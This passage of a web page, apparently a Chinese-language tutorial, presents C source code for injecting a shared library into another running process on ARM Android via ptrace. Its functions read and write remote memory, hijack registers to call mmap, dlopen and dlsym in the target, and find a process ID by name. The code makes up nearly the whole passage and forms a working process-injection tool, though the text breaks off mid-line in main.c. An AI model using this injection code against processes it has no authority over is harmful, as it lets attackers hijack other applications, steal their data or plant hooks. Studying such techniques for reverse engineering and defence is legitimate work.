class="number">0</span>);</div><div class="line">		<span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</div><div class="line">		pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">		pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( nRemainCount &gt; <span class="number">0</span> )</div><div class="line">	&#123;</div><div class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span class="number">0</span>);</div><div class="line">		<span class="built_in">memcpy</span>(pCurDestBuf, (<span class="keyword">char</span> *)(&amp;lTmpBuf), nRemainCount);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// </span></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace将数据写入到远程进程空间中</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，pWriteAddr表示写入数据到远程进程的内存地址</span></div><div class="line"><span class="comment">				  pWriteData用于存储写入数据的地址，size表示写入数据的大小</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示写入数据成功，返回-1表示写入数据失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_writedata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pWriteAddr, <span class="keyword">uint8_t</span> *pWriteData, <span class="keyword">uint32_t</span> size)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">uint32_t</span> nWriteCount = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint8_t</span> *pCurSrcBuf = pWriteData;</div><div class="line">	<span class="keyword">uint8_t</span> *pCurDestBuf = pWriteAddr;</div><div class="line">	<span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint32_t</span> i = <span class="number">0</span>;</div><div class="line">	</div><div class="line">	nWriteCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">	nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line"></div><div class="line">	<span class="comment">// 先讲数据以sizeof(long)字节大小为单位写入到远程进程内存空间中</span></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nWriteCount; i ++)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</div><div class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)  <span class="comment">// PTRACE_POKETEXT表示从远程内存空间写入一个sizeof(long)大小的数据</span></div><div class="line">		&#123;</div><div class="line">			LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</div><div class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">		&#125;</div><div class="line">		pCurSrcBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">		pCurDestBuf += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="comment">// 将剩下的数据写入到远程进程内存空间中</span></div><div class="line">	<span class="keyword">if</span> (nRemainCount &gt; <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurDestBuf, <span class="literal">NULL</span>); <span class="comment">//先取出原内存中的数据，然后将要写入的数据以单字节形式填充到低字节处</span></div><div class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(&amp;lTmpBuf), pCurSrcBuf, nRemainCount);</div><div class="line">		<span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, pCurDestBuf, lTmpBuf) &lt; <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			LOGD(<span class="string">"Write Remote Memory error, MemoryAddr:0x%lx"</span>, (<span class="keyword">long</span>)pCurDestBuf);</div><div class="line">			<span class="keyword">return</span> <span class="number">-1</span>;			</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace远程call函数</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，ExecuteAddr为远程进程函数的地址</span></div><div class="line"><span class="comment">                  parameters为函数参数的地址，regs为远程进程call函数前的寄存器环境</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示call函数成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> ExecuteAddr, <span class="keyword">long</span> *parameters, <span class="keyword">long</span> num_params, struct pt_regs* regs)</span>    </span></div><div class="line"><span class="function"></span>&#123;    </div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="comment">// ARM处理器，函数传递参数，将前四个参数放到r0-r3，剩下的参数压入栈中</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;    </div><div class="line">        regs-&gt;uregs[i] = parameters[i];    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;    </div><div class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    <span class="comment">// 分配栈空间，栈的方向是从高地址到低地址</span></div><div class="line">        <span class="keyword">if</span> (ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;ARM_sp, (<span class="keyword">uint8_t</span> *)&amp;parameters[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>))  == <span class="number">-1</span>)</div><div class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    regs-&gt;ARM_pc = ExecuteAddr;           <span class="comment">//设置ARM_pc寄存器为需要调用的函数地址</span></div><div class="line">    <span class="comment">// 与BX跳转指令类似，判断跳转的地址位[0]是否为1，如果为1，则将CPST寄存器的标志T置位，解释为Thumb代码</span></div><div class="line">	<span class="comment">// 若为0，则将CPSR寄存器的标志T复位，解释为ARM代码</span></div><div class="line">	<span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;    </div><div class="line">        <span class="comment">/* thumb */</span>    </div><div class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);    </div><div class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;    </div><div class="line">    &#125; <span class="keyword">else</span> &#123;    </div><div class="line">        <span class="comment">/* arm */</span>    </div><div class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;        </div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span> || ptrace_continue(pid) == <span class="number">-1</span>) &#123;    </div><div class="line">        LOGD(<span class="string">"ptrace set regs or continue error, pid:%d"</span>, pid);  </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </div><div class="line">	<span class="comment">// 对于使用ptrace_cont运行的子进程，它会在3种情况下进入暂停状态：①下一次系统调用；②子进程退出；③子进程的执行发生错误。</span></div><div class="line">	<span class="comment">// 参数WUNTRACED表示当进程进入暂停状态后，立即返回</span></div><div class="line">	<span class="comment">// 将ARM_lr（存放返回地址）设置为0，会导致子进程执行发生错误，则子进程进入暂停状态</span></div><div class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </div><div class="line">    </div><div class="line">	<span class="comment">// 判断是否成功执行函数</span></div><div class="line">    LOGD(<span class="string">"ptrace call ret status is %d\n"</span>, stat); </div><div class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </div><div class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </div><div class="line">            LOGD(<span class="string">"ptrace call error"</span>);  </div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </div><div class="line">        &#125;  </div><div class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </div><div class="line">    &#125;</div><div class="line"></div><div class="line">	<span class="comment">// 获取远程进程的寄存器值，方便获取返回值</span></div><div class="line">	<span class="keyword">if</span> (ptrace_getregs(pid, regs) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"After call getregs error"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    在指定进程中搜索对应模块的基址</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，若为-1表示自身进程，ModuleName表示要搜索的模块的名称</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示获取模块基址失败，返回非0为要搜索的模块基址</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetModuleBaseAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* ModuleName)</span>    </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    FILE *fp = <span class="literal">NULL</span>;    </div><div class="line">    <span class="keyword">long</span> ModuleBaseAddr = <span class="number">0</span>; 	</div><div class="line">	<span class="keyword">char</span> *ModulePath, *MapFileLineItem;</div><div class="line">    <span class="keyword">char</span> szFileName[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;    </div><div class="line">    <span class="keyword">char</span> szMapFileLine[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">char</span> szProcessInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    </div><div class="line">	<span class="comment">// 读取"/proc/pid/maps"可以获得该进程加载的模块</span></div><div class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;    </div><div class="line">        <span class="comment">//  枚举自身进程模块 </span></div><div class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/self/maps"</span>);    </div><div class="line">    &#125; <span class="keyword">else</span> &#123;    </div><div class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/%d/maps"</span>, pid);    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    fp = fopen(szFileName, <span class="string">"r"</span>);    </div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) </div><div class="line">	&#123;    </div><div class="line">        <span class="keyword">while</span> (fgets(szMapFileLine, <span class="keyword">sizeof</span>(szMapFileLine), fp)) &#123;</div><div class="line">			<span class="keyword">if</span> (<span class="built_in">strstr</span>(szMapFileLine, ModuleName))</div><div class="line">			&#123;</div><div class="line">				MapFileLineItem = strtok(szMapFileLine, <span class="string">" \t"</span>); <span class="comment">// 基址信息</span></div><div class="line">                <span class="keyword">char</span> *Addr = strtok(szMapFileLine, <span class="string">"-"</span>);    </div><div class="line">                ModuleBaseAddr = strtoul(Addr, <span class="literal">NULL</span>, <span class="number">16</span> );    </div><div class="line">    </div><div class="line">                <span class="keyword">if</span> (ModuleBaseAddr == <span class="number">0x8000</span>)    </div><div class="line">                    ModuleBaseAddr = <span class="number">0</span>;    </div><div class="line">    </div><div class="line">                <span class="keyword">break</span>;   				</div><div class="line">			&#125;</div><div class="line">        &#125;    </div><div class="line">    </div><div class="line">        fclose(fp) ;    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)ModuleBaseAddr;       </div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    获取远程进程与本进程都加载的模块中函数的地址</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，ModuleName表示模块名称，LocalFuncAddr表示本地进程中该函数的地址</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回远程进程中对应函数的地址</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetRemoteFuncAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span> *ModuleName, <span class="keyword">void</span> *LocalFuncAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">void</span> *LocalModuleAddr, *RemoteModuleAddr, *RemoteFuncAddr;</div><div class="line">	</div><div class="line">	LocalModuleAddr = GetModuleBaseAddr(<span class="number">-1</span>, ModuleName);</div><div class="line">	RemoteModuleAddr = GetModuleBaseAddr(pid, ModuleName);</div><div class="line">	</div><div class="line">	RemoteFuncAddr = (<span class="keyword">void</span> *)((<span class="keyword">long</span>)LocalFuncAddr - (<span class="keyword">long</span>)LocalModuleAddr + (<span class="keyword">long</span>)RemoteModuleAddr);</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> RemoteFuncAddr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    通过远程直接调用dlopen\dlsym的方法ptrace注入so模块到远程进程中</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，LibPath为被远程注入的so模块路径，FunctionName为远程注入的模块后调用的函数</span></div><div class="line"><span class="comment">				  FuncParameter指向被远程调用函数的参数（若传递字符串，需要先将字符串写入到远程进程空间中），NumParameter为参数的个数</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示注入成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">char</span>* LibPath,<span class="keyword">char</span>* FunctionName,<span class="keyword">long</span>* FuncParameter ,<span class="keyword">long</span> NumParameter)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">  	<span class="keyword">int</span> iRet = <span class="number">-1</span>;</div><div class="line">  	<span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">CurrentRegs</span>,<span class="title">OriginalRegs</span>;</span>	<span class="comment">//备份原始寄存器</span></div><div class="line">  	<span class="keyword">void</span> *mmap_addr,*dlopen_addr,*dlsym_addr,*dlclose_addr,*dlerror_addr; </div><div class="line"> 	<span class="keyword">void</span> *RemoteMapMemoryAddr, *RemoteModuleAddr, *RemoteModuleFuncAddr; <span class="comment">//远程进程内存映射地址(保存调用参数)，模块地址, 远程函数地址</span></div><div class="line"></div><div class="line"> 	<span class="keyword">long</span> parameters[<span class="number">6</span>];</div><div class="line"></div><div class="line"> 	<span class="comment">//1. attach到进程</span></div><div class="line"> 	<span class="keyword">if</span>(ptrace_attach(pid) == <span class="number">-1</span>)</div><div class="line"> 		<span class="keyword">return</span> iRet;</div><div class="line"></div><div class="line"> 	<span class="comment">//2. 保存当前环境</span></div><div class="line"> 	<span class="keyword">if</span>(ptrace_getregs(pid,&amp;CurrentRegs) == <span class="number">-1</span>)</div><div class="line"> 	&#123;</div><div class="line"> 		ptrace_detach(pid);</div><div class="line"> 		<span class="keyword">return</span> iRet;</div><div class="line"> 	&#125;</div><div class="line"> 	<span class="built_in">memcpy</span>(&amp;OriginalRegs,&amp;CurrentRegs,<span class="keyword">sizeof</span>(struct pt_regs));</div><div class="line"></div><div class="line"> 	<span class="comment">//3.获取远程mmap函数地址 </span></div><div class="line"> 	<span class="comment">//map()  creates a new mapping in the virtual address space of the calling process.</span></div><div class="line"> 	<span class="comment">//void *mmap(void *addr, size_t length, int prot, int flags,</span></div><div class="line">    <span class="comment">//              int fd, off_t offset);</span></div><div class="line"></div><div class="line"> 	mmap_addr = GetRemoteFuncAddr(pid,libc_path,(<span class="keyword">void</span>*)mmap);</div><div class="line"> 	LOGD(<span class="string">"[+]mmap RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)mmap_addr);</div><div class="line">  </div><div class="line"> 	<span class="comment">//4. 设置mmap函数参数</span></div><div class="line"></div><div class="line"> 	parameters[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line"> 	parameters[<span class="number">1</span>] = <span class="number">0x1000</span>;</div><div class="line"> 	parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC; <span class="comment">//内存属性</span></div><div class="line"> 	parameters[<span class="number">3</span>] = MAP_ANONYMOUS | MAP_PRIVATE;		<span class="comment">//匿名映射</span></div><div class="line"> 	parameters[<span class="number">4</span>] = <span class="number">0</span>;</div><div class="line"> 	parameters[<span class="number">5</span>] = <span class="number">0</span>;</div><div class="line"> </div><div class="line"> 	<span class="keyword">if</span>(ptrace_call(pid , (<span class="keyword">long</span>)mmap_addr , parameters , <span class="number">6</span> , &amp;CurrentRegs))</div><div class="line"> 	&#123;</div><div class="line"> 		LOGD(<span class="string">"Call Remote mmap Func Failed"</span>);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line"> 	&#125;</div><div class="line"></div><div class="line"> 	RemoteMapMemoryAddr = (<span class="keyword">void</span>*)ptrace_getret(&amp;CurrentRegs);	<span class="comment">//获取分配内存的起始地址</span></div><div class="line"> 	LOGD(<span class="string">"[+]Remote Process Map Memory Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteMapMemoryAddr);</div><div class="line"></div><div class="line"> 	<span class="comment">// 分别获取dlopen、dlsym、dlclose等函数的地址</span></div><div class="line">	dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlopen);</div><div class="line">	dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlsym);</div><div class="line">	dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlclose);</div><div class="line">	dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlerror);</div><div class="line"></div><div class="line"></div><div class="line">	LOGD(<span class="string">"[+]dlopen RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlopen_addr);</div><div class="line">	LOGD(<span class="string">"[+]dlsym RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlsym_addr);</div><div class="line">	LOGD(<span class="string">"[+]dlclose RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlclose_addr);</div><div class="line">	LOGD(<span class="string">"[+]dlerror RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlerror_addr);</div><div class="line">	</div><div class="line">	<span class="keyword">if</span>(ptrace_writedata(pid,RemoteMapMemoryAddr,LibPath,<span class="built_in">strlen</span>(LibPath)+<span class="number">1</span>) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Write LibPath:%s to RemoteProcess error"</span>, LibPath);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// loadlibrary</span></div><div class="line">	<span class="comment">// 设置dlopen的参数,返回值为模块加载的地址</span></div><div class="line">	<span class="comment">// void *dlopen(const char *filename, int flag);</span></div><div class="line">	parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteMapMemoryAddr;</div><div class="line">	parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlopen_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Call Remote dlopen Func Failed"</span>);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// RemoteModuleAddr为远程进程加载注入模块的地址</span></div><div class="line">	RemoteModuleAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</div><div class="line">	LOGD(<span class="string">"Remote Process load module Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleAddr);</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> ((<span class="keyword">long</span>)RemoteModuleAddr == <span class="number">0x0</span>)   <span class="comment">// dlopen 错误</span></div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"dlopen error"</span>);</div><div class="line">		<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlerror_addr, parameters, <span class="number">0</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</div><div class="line">		&#123;</div><div class="line">			LOGD(<span class="string">"Call Remote dlerror Func Failed"</span>);</div><div class="line">			ptrace_detach(pid);</div><div class="line">			<span class="keyword">return</span> iRet;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">char</span> *Error = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</div><div class="line">		<span class="keyword">char</span> LocalErrorInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">		ptrace_readdata(pid, Error, LocalErrorInfo, <span class="number">1024</span>);</div><div class="line">		LOGD(<span class="string">"dlopen error:%s"</span>, LocalErrorInfo);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;	</div><div class="line"></div><div class="line">	<span class="comment">// 将so库中需要调用的函数名称写入到远程进程内存空间中</span></div><div class="line">	<span class="keyword">if</span> (ptrace_writedata(pid, RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>, FunctionName, <span class="built_in">strlen</span>(FunctionName) + <span class="number">1</span>) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Write FunctionName:%s to RemoteProcess error"</span>, FunctionName);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//GetProcAddress</span></div><div class="line">	<span class="comment">// 设置dlsym的参数，返回值为远程进程内函数的地址</span></div><div class="line">	<span class="comment">// void *dlsym(void *handle, const char *symbol);</span></div><div class="line">	parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteModuleAddr;</div><div class="line">	parameters[<span class="number">1</span>] = (<span class="keyword">long</span>)(RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>);</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlsym_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Call Remote dlsym Func Failed"</span>);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;	</div><div class="line"></div><div class="line">	<span class="comment">// RemoteModuleFuncAddr为远程进程空间内获取的函数地址</span></div><div class="line">	RemoteModuleFuncAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</div><div class="line">	LOGD(<span class="string">"[+]Remote Process ModuleFunc Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleFuncAddr);</div><div class="line"></div><div class="line">	<span class="comment">// call </span></div><div class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)RemoteModuleFuncAddr, FuncParameter, NumParameter, &amp;CurrentRegs) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Call Remote injected Func Failed"</span>);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (ptrace_setregs(pid, &amp;OriginalRegs) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Recover reges failed"</span>);</div><div class="line">		ptrace_detach(pid);</div><div class="line">		<span class="keyword">return</span> iRet;		</div><div class="line">	&#125;</div><div class="line">	LOGD(<span class="string">"Recover Regs Success"</span>);</div><div class="line">	ptrace_getregs(pid, &amp;CurrentRegs);</div><div class="line">	<span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)) != <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Set Regs Error"</span>);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="comment">//Detach</span></div><div class="line">	<span class="keyword">if</span> (ptrace_detach(pid) == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"ptrace detach failed"</span>);</div><div class="line">		<span class="keyword">return</span> iRet;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/************************************************************</span></div><div class="line"><span class="comment">  FileName: main.c</span></div><div class="line"><span class="comment">  Description:       ptrace注入      </span></div><div class="line"><span class="comment">***********************************************************/</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inject.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></div><div class="line"></div><div class="line"></div><div class="line">  <span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    通过进程名称定位到进程的PID</span></div><div class="line"><span class="comment">  Input:          process_name为要定位的进程名称</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回定位到的进程PID，若为-1，表示定位失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="keyword">pid_t</span> FindPidByProcessName(<span class="keyword">const</span> <span class="keyword">char</span> *process_name)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> ProcessDirID = <span class="number">0</span>;</div><div class="line">	<span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</div><div class="line">	FILE *fp = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> filename[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">char</span> cmdline[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">entry</span> = <span class="title">NULL</span>;</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( process_name == <span class="literal">NULL</span> )</div><div 